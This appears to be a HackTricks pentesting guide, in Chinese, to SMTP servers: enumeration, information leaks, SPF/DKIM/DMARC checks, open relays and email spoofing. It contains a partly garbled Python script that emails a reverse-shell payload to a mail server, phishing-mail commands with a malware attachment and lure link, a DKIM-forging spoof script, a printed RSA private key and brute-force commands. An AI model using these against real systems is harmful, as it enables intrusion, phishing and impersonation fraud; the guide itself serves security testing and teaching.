# 25,465,587 - Pentesting SMTP/s

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* 上关注\*\*我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**即时可用的漏洞评估和渗透测试设置**。从任何地方运行完整的渗透测试，使用 20 多种工具和功能，从侦察到报告。我们不取代渗透测试人员 - 我们开发定制工具、检测和利用模块，让他们有更多时间深入挖掘、弹出 shell 并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

## **基本信息**

**简单邮件传输协议（SMTP）** 是 TCP/IP 套件中用于**发送和接收电子邮件**的协议。由于在接收方限制消息排队的能力有限，SMTP 通常与 **POP3 或 IMAP** 一起使用。这些附加协议使用户能够将消息存储在服务器邮箱中，并定期下载它们。

在实践中，**电子邮件程序**通常使用 **SMTP 发送电子邮件**，同时使用 **POP3 或 IMAP 接收**它们。在基于 Unix 的系统上，**sendmail** 是最常用于电子邮件目的的 SMTP 服务器。商业软件包 Sendmail 包含一个 POP3 服务器。此外，**Microsoft Exchange** 提供 SMTP 服务器，并提供包括 POP3 支持的选项。

**默认端口：** 25,465(ssl),587(ssl)

```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```

### 电子邮件头部

如果你有机会**让受害者发送电子邮件给你**（例如通过网页上的联系表单），一定要这样做，因为**你可以通过查看邮件头部了解受害者的内部拓扑结构**。

你还可以从SMTP服务器获取一封邮件，尝试**向该服务器发送一封邮件到一个不存在的地址**（因为服务器会向攻击者发送一个 NDN 邮件）。但是，请确保你从一个允许的地址发送邮件（检查 SPF 策略），并且你能够接收 NDN 消息。

你还应该尝试**发送不同内容，因为你可以在邮件头部找到更多有趣的信息**，比如：`X-Virus-Scanned: by av.domain.com`\
你应该发送 EICAR 测试文件。\
检测到**防病毒软件**可能会让你利用**已知的漏洞**。

## 基本操作

### **横幅抓取/基本连接**

**SMTP:**

```bash
nc -vn <IP> 25
```

**SMTPS**：

SMTPS是一种通过SSL或TLS加密的SMTP协议。

```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

### 查找组织的MX服务器

In order to find the MX servers of an organization, you can use tools like `nslookup` or `dig` to query the DNS records.

要查找组织的MX服务器，您可以使用`nslookup`或`dig`等工具来查询DNS记录。

```bash
dig +short mx google.com
```

### 枚举

```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```

### NTLM Auth - 信息泄露

如果服务器支持NTLM认证（Windows），您可以获取敏感信息（版本）。更多信息[**在这里**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)。

```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

或者使用 **nmap** 插件 `smtp-ntlm-info.nse` 来**自动化**这个过程。

### 内部服务器名称 - 信息泄露

一些 SMTP 服务器在发出不完整地址的“MAIL FROM”命令时会自动补全发件人地址，从而泄露其内部名称：

```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```

### 嗅探

检查是否从发送到端口25的数据包中嗅探到了一些密码

### [身份验证暴力破解](../../generic-methodologies-and-resources/brute-force.md#smtp)

## 用户名暴力破解枚举

**身份验证并非总是必需的**

### RCPT TO

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

### VRFY

### VRFY

VRFY命令用于验证用户是否存在于SMTP服务器上。攻击者可以使用VRFY命令来枚举有效的用户账户。在许多现代SMTP服务器上，VRFY命令通常被禁用，因为它可能导致信息泄露。

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```

### EXPN

### EXPN

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```

### 自动化工具

```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**漏洞评估和渗透测试的即时可用设置**。使用20多种工具和功能从侦察到报告运行完整的渗透测试。我们不取代渗透测试人员 - 我们开发定制工具、检测和利用模块，为他们节省时间深入挖掘、弹出shell并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

## DSN报告

**传递状态通知报告**：如果您向一个组织发送一封**电子邮件**到一个**无效地址**，该组织将通知该地址无效，并向您发送一封**邮件回复**。返回的电子邮件的**标头**将**包含**可能的**敏感信息**（如与报告互动的邮件服务的IP地址或反病毒软件信息）。

## [命令](smtp-commands.md)

### 从Linux控制台发送电子邮件

```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```

### 使用Python发送电子邮件

<details>

<summary>Python代码在这里</summary>

\`\`\`python from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText import smtplib import sys

lhost = "127.0.0.1" lport = 443 rhost = "192.168.1.1" rport = 25 # 489,587

### create message object instance

msg = MIMEMultipart()

### setup the parameters of the message

password = "" msg\['From'] = "attacker@local" msg\['To'] = "victim@local" msg\['Subject'] = "This is not a drill!"

### payload

message = ("& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("\[\*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain')) server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()\[0] != 250: print("\[-]Connection Error") exit()

server.starttls()

### Uncomment if log-in with authencation

### server.login(msg\['From'], password)

server.sendmail(msg\['From'], msg\['To'], msg.as\_string()) server.quit()

print("\[\*\*\*]successfully sent email to %s:" % (msg\['To']))

````
</details>

## SMTP走私

SMTP走私漏洞允许绕过所有SMTP保护措施（有关保护措施的更多信息，请查看下一节）。有关SMTP走私的更多信息，请查看：

<div data-gb-custom-block data-tag="content-ref" data-url='smtp-smuggling.md'>

[smtp-smuggling.md](smtp-smuggling.md)

</div>

## 电子邮件欺骗对策

通过使用**SPF**、**DKIM**和**DMARC**，组织可以防止未经授权的电子邮件代表其发送，因为SMTP消息很容易被伪造。

有关这些对策的**完整指南**可在[https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)上找到。

### SPF

<div data-gb-custom-block data-tag="hint" data-style='danger'>

SPF [在2014年被"弃用"](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。这意味着，不再在`_spf.domain.com`中创建**TXT记录**，而是在`domain.com`中使用**相同的语法**创建。\
此外，为了重用以前的SPF记录，通常会找到类似`"v=spf1 include:_spf.google.com ~all"`的内容。

</div>

**发件人策略框架**（SPF）是一种机制，使邮件传输代理（MTA）能够通过查询组织定义的授权邮件服务器列表来验证发送电子邮件的主机是否经过授权。这个列表包括在SPF记录中的各种“**机制**”，指定了IP地址/范围、域和其他实体，**这些实体被授权代表域名发送电子邮件**。

#### 机制

来自[Wikipedia](https://en.wikipedia.org/wiki/Sender\_Policy\_Framework)：

| 机制     | 描述                                                                                                                                                                                                                                                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 始终匹配；用于默认结果，例如对于未被先前机制匹配的所有IP，使用`-all`。                                                                                                                                                                                                                                  |
| A         | 如果域名具有可以解析为发件人地址的地址记录（A或AAAA），则匹配。                                                                                                                                                                                                                   |
| IP4       | 如果发件人在给定的IPv4地址范围内，则匹配。                                                                                                                                                                                                                                                                          |
| IP6       | 如果发件人在给定的IPv6地址范围内，则匹配。                                                                                                                                                                                                                                                                          |
| MX        | 如果域名具有解析为发件人地址的MX记录，它将匹配（即邮件来自域的一个传入邮件服务器）。                                                                                                                                                                          |
| PTR       | 如果客户端地址的域名（PTR记录）在给定域中，并且该域名解析为客户端地址（前向确认反向DNS），则匹配。如果可能，应避免使用此机制。                                                                                                                                                     |
| EXISTS    | 如果给定的域名解析为任何地址，则匹配（无论解析为何种地址）。这很少使用。与SPF宏语言一起，它提供了更复杂的匹配，如DNSBL查询。                                                                                                                                                                                           |
| INCLUDE   | 引用另一个域的策略。如果该域的策略通过，此机制通过。但是，如果包含的策略失败，处理将继续进行。要完全委托给另一个域的策略，必须使用重定向扩展。                                                                                                                                                     |
| REDIRECT  | <p>重定向是指向托管SPF策略的另一个域名的指针，它允许多个域共享相同的SPF策略。在处理共享相同电子邮件基础设施的大量域时，这是很有用的。</p><p>将使用重定向机制中指示的域的SPF策略。</p> |

还可以识别**限定符**，指示**如果匹配了机制应该执行什么操作**。默认情况下，使用**限定符“+”**（因此，如果匹配了任何机制，表示允许）。\
通常，您会在**每个SPF策略的末尾**看到类似**\~all**或**-all**的内容。这用于指示**如果发件人不符合任何SPF策略，则应将电子邮件标记为不受信任（\~）或拒绝（-）电子邮件**。

#### 限定符

策略中的每个机制可能以四个限定符之一作为前缀，以定义预期结果：

* **`+`**：对应于通过结果。默认情况下，机制假定此限定符，使`+mx`等同于`mx`。
* **`?`**：表示中立结果，类似于无（没有特定策略）。
* **`~`**：表示SOFTFAIL，作为中立和FAIL之间的中间地带。通常接受符合此结果的电子邮件，但会相应标记。
* **`-`**：表示FAIL，建议直接拒绝该电子邮件。

在接下来的示例中，展示了**google.com的SPF策略**。请注意，在第一个SPF策略中包含了来自不同域的SPF策略：
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
````

传统上，可以伪造任何没有正确/任何 SPF 记录的域名。**如今**，如果**电子邮件**来自**没有有效 SPF 记录的域名**，可能会被**自动拒收/标记为不受信任**。

要检查域名的 SPF，可以使用在线工具，如：[https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

**DKIM（DomainKeys Identified Mail）**

DKIM 用于签署出站电子邮件，允许外部邮件传输代理（MTA）通过从 DNS 检索域的公钥来验证它们。这个公钥位于域的 TXT 记录中。要访问此密钥，必须知道选择器和域名。

例如，要请求密钥，域名和选择器是必不可少的。这些可以在邮件头 `DKIM-Signature` 中找到，例如，`d=gmail.com;s=20120113`。

获取此信息的命令可能如下所示：

```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```

**DMARC (Domain-based Message Authentication, Reporting & Conformance)**

DMARC通过构建在SPF和DKIM协议之上来增强电子邮件安全性。它概述了指导邮件服务器处理特定域中的电子邮件的策略，包括如何处理身份验证失败以及将报告发送到何处以报告有关电子邮件处理操作的信息。

**要获取DMARC记录，您需要查询子域\_dmarc**

```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```

**DMARC标签**

**子域名呢？**

**从** [**这里**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**。**\
您需要为希望从中发送邮件的每个子域名设置单独的SPF记录。\
以下内容最初发布在openspf.org上，这曾经是这类信息的重要资源。

魔鬼问题：子域名呢？

如果我从pielovers.demon.co.uk收到邮件，pielovers没有SPF数据，我应该返回一级并测试demon.co.uk的SPF吗？不。Demon的每个子域名都是不同的客户，每个客户可能有自己的策略。Demon的策略默认不适用于所有客户是没有意义的；如果Demon想要这样做，它可以为每个子域名设置SPF记录。

因此，对于SPF发布者的建议是：您应该为具有A或MX记录的每个子域名或主机名添加一个SPF记录。

具有通配符A或MX记录的站点还应具有通配符SPF记录，格式为： \* IN TXT "v=spf1 -all"

这是有道理的 - 子域名很可能位于不同的地理位置，并具有非常不同的SPF定义。

**开放中继**

在发送电子邮件时，确保它们不被标记为垃圾邮件至关重要。通常通过受收件人信任的**中继服务器**来实现。然而，一个常见的挑战是管理员可能不完全了解**哪些IP范围是安全允许的**。这种缺乏理解可能导致在设置SMTP服务器时出现错误，这是安全评估中经常发现的风险。

一些管理员为了避免邮件传递问题，特别是与潜在或正在进行的客户的通信有关，会采用一种解决方法，即**允许来自任何IP地址的连接**。这是通过配置SMTP服务器的`mynetworks`参数以接受所有IP地址来实现的，如下所示：

```bash
mynetworks = 0.0.0.0/0
```

要检查邮件服务器是否是一个开放中继（意味着它可以转发来自任何外部来源的电子邮件），通常会使用`nmap`工具。它包含一个专门设计用于测试这一点的特定脚本。使用`nmap`在端口25上对服务器进行详细扫描的命令（例如，IP为10.10.10.10）是：

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```

**工具**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **检查 SPF 和 DMARC 配置错误**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **自动获取 SPF 和 DMARC 配置**

**发送欺骗邮件**

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**或者您可以使用工具：**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)

```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```

如果在使用 dkim python lib 解析密钥时出现任何错误，请随时使用以下密钥。\
**注意**：这只是一个快速修复方法，在某些情况下，由于某种原因，openssl私钥**无法被 dkim 解析**，可以用此方法进行快速检查。

```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```

**或者您可以手动执行：**

<pre class="language-php"><code class="lang-php"><strong># 这将发送一条未签名的消息
</strong><strong>mail("your_email@gmail.com", "测试主题！", "嘿！这是一个测试", "From: administrator@victim.com");
</strong></code></pre>

```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```

**更多信息**

**在** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **找到关于这些保护措施的更多信息**

**其他钓鱼指标**

* 域名的年龄
* 指向 IP 地址的链接
* 链接操纵技术
* 可疑（不常见）附件
* 邮件内容损坏
* 使用与邮件标头不同的值
* 存在有效且受信任的 SSL 证书
* 将页面提交给 Web 内容过滤站点

#### 通过 SMTP 进行数据泄露

**如果可以通过 SMTP 发送数据** [**阅读此内容**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**。**

#### 配置文件

**Postfix**

通常，如果安装了 Postfix，在 `/etc/postfix/master.cf` 中包含**在用户收到新邮件时执行的脚本**。例如，`flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` 这一行意味着如果用户 mark 收到新邮件，将执行 `/etc/postfix/filtering`。

其他配置文件：

```
sendmail.cf
submit.cf
```

#### 参考资料

* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/)

#### HackTricks 自动化命令

```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```

<img src="../../.gitbook/assets/image (2) (1) (1).png" alt="" data-size="original">

**漏洞评估和渗透测试的即时可用设置**。使用20多种工具和功能从侦察到报告运行完整的渗透测试。我们不取代渗透测试人员 - 我们开发定制工具、检测和利用模块，为他们节省时间深入挖掘、弹出shell并享受乐趣。

</details>
